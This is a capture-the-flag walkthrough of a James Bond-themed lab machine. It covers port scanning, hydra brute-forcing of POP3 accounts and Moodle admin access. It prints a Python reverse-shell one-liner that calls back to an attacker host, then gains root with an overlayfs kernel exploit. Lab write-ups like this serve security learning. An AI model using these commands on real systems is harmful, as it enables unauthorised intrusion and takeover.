# James Bond Machine

> Konstantinos Pap - 7/5/2021
export IP=10.10.55.232


## Start off with a simple nmap enumaration on default ports. 
Found 25 and 80 open. Took a look on 80 which seemed it was a static webpage (Especially after running gobuster and getting 0 hits.)

The website greets us with a terminal based inteface. From the webpage we can see it imports a terminal.js file. After taking a closer look at it we can see this comment

```bash
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```

We know there are 3 users at least here. Natalya, and Boris and the guy who wrote this message. Boris' password is encoded probably using html basic encoding. Let's decode it using burp. The password ended up being `InvincibleHack3r`

The server also prompts us to login to /sev-home/. Let's see if that actually exists. This actually hits us with a prompt to authenticate from the browser directly.
After a lot of failed attempts i tried the username Boris with lowercase b and it worked... We can pass in as a username `boris` and as a password the password we found `InvincibleHack3r` and surely we get a new response

```

GoldenEye

GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)

Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system

Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port

```
This basically informs us of another very high port which is not a default and we need to run nmap on all ports to find it. Let's run nmap on all ports.
`sudo nmap -sS -sV -sC -vvv -oN nmap/allports -p- 10.10.55.232` and wait for the results.

As we wait let's enumerate the server more and see the website. After viewing the source code we figure out this comment: 
```html
<!--
Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris

 -->
```
So Natalya the second user is a network operator as Boris is.

Nmap finally returned after a few minutes and we found the hidden ports
`Discovered open port 55007/tcp on 10.10.55.232` &
`Discovered open port 55006/tcp on 10.10.55.232`
Final nmap results.
```
PORT      STATE SERVICE     REASON         VERSION
25/tcp    open  smtp        syn-ack ttl 63 Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown syn-ack ttl 63
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: RESP-CODES STLS PIPELINING AUTH-RESP-CODE SASL(PLAIN) USER TOP CAPA UIDL
|_ssl-date: TLS randomness does not represent time
```

# SideNote: nikto found a possibly weak php part of the website `http://10.10.55.232/splashAdmin.php`
```
+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
```
We found a txt file on searchsploit but it doesn't seem to work. After all Cobalt Qube says was decommissioned 
From there we find possible 3 more usernames. We know there is an admin that has nothing to do with anyone else we already know. There is Xenia which is a contractor and a Janus user.
Seems like the email server is the only way in...

# Continuing with the email server
Trying to log into pop3 service with Boris' credentials is not working. We can try and bruteforce the service to see if we can get any passwords for the 2 users we know

Let's use hydra...
`hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.55.232:55007`
We eventually get the password `secret1!`
`[55007][pop3] host: 10.10.55.232   login: boris   password: secret1!`

That took forever so i'll switch the wordlist to see if we are lucky this time...
`hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://10.10.55.232:55007`
Doing the same for natalya gives us the password `bird`
`[55007][pop3] host: 10.10.55.232   login: natalya   password: bird`

Logging into natalya we can see she has 2 mails into her mailbox with the command stat with total of 1670 characters (?)
```
stat
+OK 2 1679
```
listing these we can see the size of each one individually...
```
list
+OK 2 messages:
1 631
2 1048
.

```
We will use the RETR command to retrieve them one by one
The first email: 
```
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
``` 
came from root@ubuntu (The administrator we knew about).

The second email:
```
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


```
So basically we know that Xenia is a contractor, and new and we definitely have her creds. (There is also probably a connection between Xenia and Boris since the admin noted that they talk in private a lot)

> Let's view boris' mails as well. 
We can notice that boris has 3 mails in his mailbox:
```
stat
+OK 3 1838
```
First email: 
```
retr 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
```
So emails are not scanned, which means we could easily send phishing mails through the system with reverse shells without getting noticed.

Second email:
```
retr 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.

```
Natalya notified Boris that she can break his codes... (Nothing we didn't already know about)

Third email:
```
retr 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
```
This seems interesting. We know the final access codes are placed within the root directory and they were transmitted through this very server and email but it seems like these are deleted maybe ? Not sure how to retrieve them.

Now added to /etc/hosts the new dns record we found `10.10.55.232 severnaya-station.com`.
We will try to connect to the specified website the admin gave to natalya `http://severnaya-station.com/gnocertdir`

And that redirected us to a probably old version of moodle...
I logged in the website as xenia with the creds found in the mail and after enumerating through the website i found her email: `xen@contrax.mil` and an unread message from Dr Doak. The message is as follows:
```
 09:24 PM: Greetings Xenia,

As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.

My email username is...

doak

Thank you,

Cheers,

Dr. Doak "The Doctor"
Training Scientist - Sr Level Training Operating Supervisor
GoldenEye Operations Center Sector
Level 14 - NO2 - id:998623-1334
Campus 4, Building 57, Floor -8, Sector 6, cube 1,007
Phone 555-193-826
Cell 555-836-0944
Office 555-846-9811
Personal 555-826-9923
Email: doak@
Please Recycle before you print, Stay Green aka save the company money!
"There's such a thing as Good Grief. Just ask Charlie Brown" - someguy
"You miss 100% of the shots you don't shoot at" - Wayne G.
THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.
```
We know his email username so we can enumerate and try to crack his password through the pop3 service. Let's blast hydra in there and try to get a password
`hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.55.232:55007`
We found the password `goat` Really secure (JK)
`[55007][pop3] host: 10.10.55.232   login: doak   password: goat`

Let's read his emails first.
He has a mail from appearing to be himself?
```
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
```
The first i'm doing here is to try to authenticate to moodle using the dr's credentials we found on the email. Apparently it works and i'm now logged in to his moodle account which means i can open the into lesson and see what's hidden in there. But i apparently can't see that yet. I'll go over to his profile and try to find anything interesting information. First thing that grabs my eye is a new email address: dualRCP90s@na.goldeneye
No messages are there, so let's go over to private files. We can see a secret.txt on the private files section which is very interesting! let's download it and see what's hidden in there!
```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

OK so we have an image, let's wget it: `wget http://severnaya-station.com/dir007key/for-007.jpg`
Let's open this up and try to figure out the hidden message. Low hanging fruits first. strings that :D ... We can see a string at the top. Let's run exiftool for a better view. In the Image Description field there is an encoded string which seems to be base64 `eFdpbnRlcjE5OTV4IQ==`
Let's decode this: `echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d`
and we get this: `xWinter1995x!`
This must be the password he wanted to give to us and couldn't through the webapps. That means we have the admin's password? Let's try to login into moodle with these credentials... And YES with `Admin` & `xWinter1995x!` we manage to get access to the moodle site
Finally managed to get into the intro lesson just to find out there's nothing in the intro lesson -_-.. What a disappointment ... Anyways let's keep moving...

Let's try to upload something that will give us a reverse shell to the webserver.
Searching for spell as the hint indicates gives us the setting where we can run python code which means we can get our revshell through there
Opening up a netcat listener here `nc -nlvp 4444` and running a payload like `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'` should pop me open a nice shell to work with.
Now we just need to trigget it...
For some reason it won't load so i'll have to go and do it manually by inspecting the element and try to figure out which is the correct url to make a new blog post and enable spell check. `http://severnaya-station.com/gnocertdir/blog/edit.php?action=add` This seems to be the right url to add a blog post so i'll try to open spell check through here..


And in fact we get the connection. Now we are www-data. We could start enumerating the machine or try to priv esc horizontally with known passwords. Although the game takes us in it's own direction. By checking the kernel version we can see that it's outdated and vulnerable to the overlayfs kernel exploit (Not the new one [I got stuck trying to make the new one work for at least an hour ... lmao]) The correct overlayfs exploit for this to work is the one from: https://www.exploit-db.com/exploits/37292
```
www-data@ubuntu:/tmp$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```
So we copy the code and we need to make one small adjustment.. Remember earlier when the admin said to Boris that he removed gcc? well the compiler they are using now is the cc so we need to change that inside the exploit as well. The exploit uses gcc to compile a shared library while it's running. We can use vim and search for gcc and replace it with cc. There's just one instance so that's easy for us. After compiling successfully (`cc exploit.c -o exploit`) the exploit we can run it and get root
```
www-data@ubuntu:/tmp$ ./a.out 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# 
```

We rooted the machine! Let's go ahead and make it official by submitting the flag.

```
# ls -la
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
# cat .flag.txt	
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/

```
Go over to the special url noted by the flag.txt file if you are a fan of james bond movies ;)

#Final Notes: 
	In linux for some reason the moodle editing system on the text area would just not load. So you should probably head over to windows in order for that to work (Took me a solid 40 minutes to figure that out)
